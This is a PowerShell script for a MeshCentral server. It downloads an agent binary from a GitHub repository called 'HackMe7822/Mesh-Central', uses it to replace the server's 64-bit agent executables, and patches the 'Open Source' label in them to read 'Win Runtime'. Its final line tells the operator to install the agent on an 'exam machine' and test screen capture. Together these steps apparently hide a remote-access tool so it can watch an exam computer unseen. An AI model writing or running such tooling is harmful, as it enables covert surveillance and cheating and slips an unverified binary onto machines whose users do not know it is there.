#Requires -RunAsAdministrator
param([string]$NewAgent = "C:\temp\MeshService64.exe")

# Auto-download from GitHub if not already present
if (-not (Test-Path $NewAgent)) {
    Write-Host "[*] Downloading MeshService64.exe from GitHub..." -ForegroundColor Cyan
    New-Item -ItemType Directory -Path (Split-Path $NewAgent) -Force | Out-Null
    try {
        Invoke-WebRequest "https://raw.githubusercontent.com/HackMe7822/Mesh-Central/main/MeshService64.exe" -OutFile $NewAgent -UseBasicParsing
    } catch {
        Write-Host "[!] Download failed: $_" -ForegroundColor Red; exit 1
    }
}
Write-Host "[+] New agent: $NewAgent ($([math]::Round((Get-Item $NewAgent).Length/1KB)) KB)" -ForegroundColor Green

# Find agents directory
$found = $null
foreach ($d in @("C:\MeshCentral\node_modules\meshcentral\agents","C:\meshcentral\node_modules\meshcentral\agents","C:\Program Files\MeshCentral\node_modules\meshcentral\agents")) {
    if (Test-Path $d) { $found = $d; break }
}
if (-not $found) {
    $found = Get-ChildItem "C:\" -Recurse -Depth 9 -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.FullName -match "node_modules.+meshcentral.+agents$" } |
        Select-Object -First 1 -ExpandProperty FullName
}
if (-not $found) { Write-Host "[!] Agents dir not found." -ForegroundColor Red; exit 1 }
Write-Host "[*] Agents dir: $found" -ForegroundColor Cyan

# List exe files
$allAgents = @(Get-ChildItem $found -Filter "*.exe" -ErrorAction SilentlyContinue)
Write-Host "[*] Files in agents dir ($($allAgents.Count)):"
$allAgents | ForEach-Object { Write-Host "    $($_.Name) ($([math]::Round($_.Length/1KB)) KB)" }

# Pick 64-bit targets (or all if none have "64" in name)
$targets = @($allAgents | Where-Object { $_.Name -match "64" })
if ($targets.Count -eq 0) { $targets = $allAgents }
Write-Host "[*] Replacing $($targets.Count) file(s)." -ForegroundColor Cyan

# Stop MeshCentral service (prefer the server app, not the MeshAgent client)
$svcName = (Get-Service | Where-Object {
    $_.Name -match "^meshcentral$" -or $_.DisplayName -match "^meshcentral$"
} | Select-Object -First 1).Name
if (-not $svcName) {
    $svcName = (Get-Service | Where-Object {
        ($_.Name -match "mesh" -or $_.DisplayName -match "mesh") -and
        $_.DisplayName -notmatch "Mesh Agent"
    } | Select-Object -First 1).Name
}
if (-not $svcName) {
    $svcName = (Get-Service | Where-Object { $_.Name -match "mesh" -or $_.DisplayName -match "mesh" } | Select-Object -First 1).Name
}
if ($svcName) {
    Write-Host "[*] Stopping $svcName..." -ForegroundColor Cyan
    Stop-Service $svcName -Force -ErrorAction SilentlyContinue
    Start-Sleep 3
}

# Replace binaries and patch strings
$replaced = 0
$oldA = [Text.Encoding]::ASCII.GetBytes("Open Source")
$newA = [Text.Encoding]::ASCII.GetBytes("Win Runtime")
$oldW = [Text.Encoding]::Unicode.GetBytes("Open Source")
$newW = [Text.Encoding]::Unicode.GetBytes("Win Runtime")

foreach ($t in $targets) {
    $bak = $t.FullName + ".bak"
    if (-not (Test-Path $bak)) { Copy-Item $t.FullName $bak -Force }
    try {
        Copy-Item $NewAgent $t.FullName -Force
        Write-Host "[+] Replaced: $($t.Name)" -ForegroundColor Green
        $replaced++
    } catch {
        Write-Host "[!] Failed to replace $($t.Name): $_" -ForegroundColor Red
        continue
    }

    $bytes = [IO.File]::ReadAllBytes($t.FullName)
    $count = 0
    foreach ($pair in @(@($oldA,$newA), @($oldW,$newW))) {
        $old = $pair[0]; $new = $pair[1]
        for ($i = 0; $i -le ($bytes.Length - $old.Length); $i++) {
            $match = $true
            for ($j = 0; $j -lt $old.Length; $j++) {
                if ($bytes[$i+$j] -ne $old[$j]) { $match = $false; break }
            }
            if ($match) {
                for ($j = 0; $j -lt $new.Length; $j++) { $bytes[$i+$j] = $new[$j] }
                $count++
                $i += $old.Length - 1
            }
        }
    }
    if ($count -gt 0) {
        [IO.File]::WriteAllBytes($t.FullName, $bytes)
        Write-Host "[+] String patch: $count replacement(s) in $($t.Name)" -ForegroundColor Green
    } else {
        Write-Host "[~] No 'Open Source' string found in $($t.Name)" -ForegroundColor Yellow
    }
}

# Restart MeshCentral
if ($svcName) {
    Start-Service $svcName -ErrorAction SilentlyContinue
    Start-Sleep 3
    $status = (Get-Service $svcName -ErrorAction SilentlyContinue).Status
    $color = if ($status -eq "Running") { "Green" } else { "Red" }
    Write-Host "[*] $svcName -> $status" -ForegroundColor $color
}

Write-Host ""
Write-Host "Done. Replaced $replaced file(s) in: $found"
Write-Host "Next: install fresh agent on exam machine, reboot once, test screen capture."
